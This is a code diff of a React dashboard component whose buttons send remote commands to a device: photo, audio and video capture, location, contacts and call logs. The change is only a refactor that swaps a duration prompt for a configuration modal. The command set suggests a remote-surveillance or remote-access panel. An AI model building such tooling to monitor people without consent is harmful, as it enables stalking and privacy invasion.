@@ -9,25 +9,25 @@ import {
   MessageSquare,
 } from 'lucide-react';
 import { LucideIcon } from 'lucide-react';
-import DurationInputModal from './DurationInputModal';
+import RemoteControlConfigModal, { RemoteControlConfig } from './RemoteControlConfigModal';
 
 interface CommandButton {
   action: string;
   label: string;
   icon: LucideIcon;
   iconColor: string;
-  requiresDuration?: boolean;
+  requiresConfig?: boolean;
 }
 
 interface CommandButtonsProps {
-  onCommandClick: (action: string, duration?: number) => void;
+  onCommandClick: (action: string, config?: RemoteControlConfig) => void;
   disabled?: boolean;
 }
 
 const commandButtons: CommandButton[] = [
-  { action: 'take_photo', label: 'Take Photo', icon: Camera, iconColor: 'text-blue-500' },
-  { action: 'record_audio', label: 'Record Audio', icon: Mic, iconColor: 'text-green-500', requiresDuration: true },
-  { action: 'record_video', label: 'Record Video', icon: Video, iconColor: 'text-purple-500', requiresDuration: true },
+  { action: 'take_photo', label: 'Take Photo', icon: Camera, iconColor: 'text-blue-500', requiresConfig: true },
+  { action: 'record_audio', label: 'Record Audio', icon: Mic, iconColor: 'text-green-500', requiresConfig: true },
+  { action: 'record_video', label: 'Record Video', icon: Video, iconColor: 'text-purple-500', requiresConfig: true },
   { action: 'get_location', label: 'Get Location', icon: Map, iconColor: 'text-orange-500' },
   { action: 'get_contacts', label: 'Get Contacts', icon: Users, iconColor: 'text-indigo-500' },
   { action: 'get_call_logs', label: 'Get Call Logs', icon: Phone, iconColor: 'text-pink-500' },
@@ -35,25 +35,25 @@ const commandButtons: CommandButton[] = [
 ];
 
 export default function CommandButtons({ onCommandClick, disabled = false }: CommandButtonsProps) {
-  const [isDurationModalOpen, setIsDurationModalOpen] = useState(false);
+  const [isConfigModalOpen, setIsConfigModalOpen] = useState(false);
   const [pendingAction, setPendingAction] = useState<string>('');
 
-  const handleCommandClick = (action: string, requiresDuration?: boolean) => {
-    if (requiresDuration) {
+  const handleCommandClick = (action: string, requiresConfig?: boolean) => {
+    if (requiresConfig) {
       setPendingAction(action);
-      setIsDurationModalOpen(true);
+      setIsConfigModalOpen(true);
     } else {
       onCommandClick(action);
     }
   };
 
-  const handleDurationConfirm = (duration: number) => {
-    onCommandClick(pendingAction, duration);
+  const handleConfigConfirm = (config: RemoteControlConfig) => {
+    onCommandClick(pendingAction, config);
     setPendingAction('');
   };
 
-  const handleDurationModalClose = () => {
-    setIsDurationModalOpen(false);
+  const handleConfigModalClose = () => {
+    setIsConfigModalOpen(false);
     setPendingAction('');
   };
 
@@ -67,10 +67,10 @@ export default function CommandButtons({ onCommandClick, disabled = false }: Com
 
         <div className="p-6">
           <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-10 gap-4">
-            {commandButtons.map(({ action, icon: Icon, label, iconColor, requiresDuration }) => (
+            {commandButtons.map(({ action, icon: Icon, label, iconColor, requiresConfig }) => (
               <button
                 key={action}
-                onClick={() => handleCommandClick(action, requiresDuration)}
+                onClick={() => handleCommandClick(action, requiresConfig)}
                 disabled={disabled}
                 className={`flex flex-col items-center gap-3 p-3 rounded-lg bg-white dark:bg-gray-700 border border-gray-200 dark:border-gray-600 hover:border-gray-300 dark:hover:border-gray-500 hover:shadow-md transition-all ${disabled ? 'opacity-50 cursor-not-allowed' : 'cursor-pointer'
                   }`}
@@ -83,10 +83,10 @@ export default function CommandButtons({ onCommandClick, disabled = false }: Com
         </div>
       </div>
 
-      <DurationInputModal
-        isOpen={isDurationModalOpen}
-        onClose={handleDurationModalClose}
-        onConfirm={handleDurationConfirm}
+      <RemoteControlConfigModal
+        isOpen={isConfigModalOpen}
+        onClose={handleConfigModalClose}
+        onConfirm={handleConfigConfirm}
         action={pendingAction}
         actionLabel={commandButtons.find(btn => btn.action === pendingAction)?.label || ''}
       />
